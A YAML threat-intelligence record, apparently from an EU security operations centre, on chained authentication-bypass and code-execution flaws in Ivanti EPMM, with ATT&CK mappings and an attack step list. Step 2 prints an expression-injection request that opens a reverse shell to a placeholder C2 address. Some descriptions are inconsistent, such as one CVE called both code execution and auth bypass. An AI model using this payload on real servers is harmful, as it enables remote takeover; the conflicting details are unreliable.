name: Authentication bypass vulnerability in Ivanti EPMM
criticality: Medium
references:
  public:
    1: https://help.ivanti.com/mi/help/enus/core/12.x/sys/CoreSystemManager/AccessControlLists_Po.htm
    2: https://www.ivanti.com/blog/epmm-security-update
    3: https://portal.cert.europa.eu/document/all-organisations/operational/2f4d98/fcffb09e-0c52-11ef-8289-0050568e1fc4/details?special=True
    4: https://labs.watchtowr.com/expression-payloads-meet-mayhem-cve-2025-4427-and-cve-2025-4428 

metadata:
  uuid: b2ce7db4-253f-4286-9b38-a1a7b60af49e
  schema: tvm::2.1
  version: 1
  created: 2025-06-27
  modified: 2025-06-27
  tlp: clear
  #author: 
  #contributors:
    #-
  organisation:
    uuid: 56b0a0f0-b0bc-47d9-bb46-02f80ae2065a
    name: EC DIGIT CSOC

threat:
  #actors:
    #- name: Not specified a specific threat actor in the reports, it's possible multiple threat actors to be involved in this exploit
      #sighting: |
        #...
      #references:
        #-
  #killchain: 
  att&ck:
    - T1190 # Exploit Public-Facing Application
    - T1068 # Exploitation for Privilege Escalation
  #chaining:
    #- relation: 
      #vector: 
      #description: |
        #...
  cve:
    - CVE-2025-4427 # This is a medium severity authentication bypass vulnerability in Ivanti EPMM allowing attackers to access protected resources without proper credentials
    - CVE-2025-4428 # A high severity remote code execution vulnerability in Ivanti EPMM allowing attackers to execute arbitrary code on the target system.
  domains:
    - Enterprise
    - Mobile
  terrain: |
    A threat actors sends crafted queries to an Ivanti EPMM API endpoint
    used for authentication purposes in web applications. The threat actor
    is abusing a vulnerability in publicly exposed interface by sending
    queries without the need to be authorisated or authenticated. 
  targets:
    - Mobile phone
    - API Endpoints
    - Identity Services
  platforms:
    - iOS
    - Android
  severity: Significant incident
  leverage:
    - Elevation of privilege
    - Infrastructure Compromise
    - Tampering
  impact:
    - Impairement
    - Business disruption
    - Identity Theft
    - Reputational Damages
    - Data Breach
  viability: Likely
  description: |
    Ivanti EPMM - formerly known as MobileIron - is a Mobile Device
    Management solution (MDM) used to centrally manage corporate and
    private mobile phones across an organisation ref [1].  

    A threat actor exploit a zero-day vulnerability in Ivanti EPMM
    system. In one of the threat actor campaigns was observed that
    the threat actor used even a second zero-day exploit chained to
    the fist one.  

    The vulnerabilities could allow an attacker to bypass
    authentication mechanisms and gain unauthorised access
    to the system. 

    The first used vulnerability is related to the handling of
    authentication tokens. An attacker can exploit this vulnerability
    by sending a crafted request to the `/api/v1/auth` endpoint.
    This flaw can be exploited without any prior authentication or
    authorisation ref [3].  

    ### Vulnerabilities in Ivanti EPMM exploitation

    - CVE-2025-4427: A vulnerability in the `/api/v1/auth` endpoint,
    which allows an attacker to bypass authentication by sending
    a crafted request with a malicious expression payload ref [3].
    - CVE-2025-4428: A vulnerability in the `/api/v1/users` endpoint,
    which allows an attacker to bypass authentication and gain access
    to sensitive user information by sending a crafted request with
    a malicious expression payload ref [3].

    Based on the provided information from the reports and analysis
    there are several steps how a threat actor might exploit an
    authentication bypass vulnerability in Ivanti EPMM:

    1. Identify the vulnerable endpoint - the threat actor identifies
    a vulnerable endpoint, such as `/api/v1/auth` or `/api/v1/users`,
    which is susceptible to authentication bypass attacks.
    2. Craft a malicious request - a threat actor crafts a malicious
    request with a specially designed payload, which can be an expression
    payload or a crafted authentication token.

    A request such as :

      ```powershell
      /mifs/rs/api/v2/featureusage?format=${''
      .getClass().forName('java.lang.Runtime')
      .getMethod('getRuntime').invoke(null)
      .exec('sh -i >& /dev/tcp/C2.IP.Add.ress/8080 0>&1').waitFor()}
      ```
    reaches the vulnerable validator before authentication, spawning a
    reverse shell.
    3. Send the malicious request - threat actor sends the malicious
    request to the vulnerable endpoint, which can bypass the authentication
    mechanism and grant access to the system.
    4. Gain unauthorised access - in the end as a final step a threat
    actor gains unauthorised access to the system, which can lead to
    further malicious activities, such as data breaches, lateral
    movement, or system compromise ref [4].  
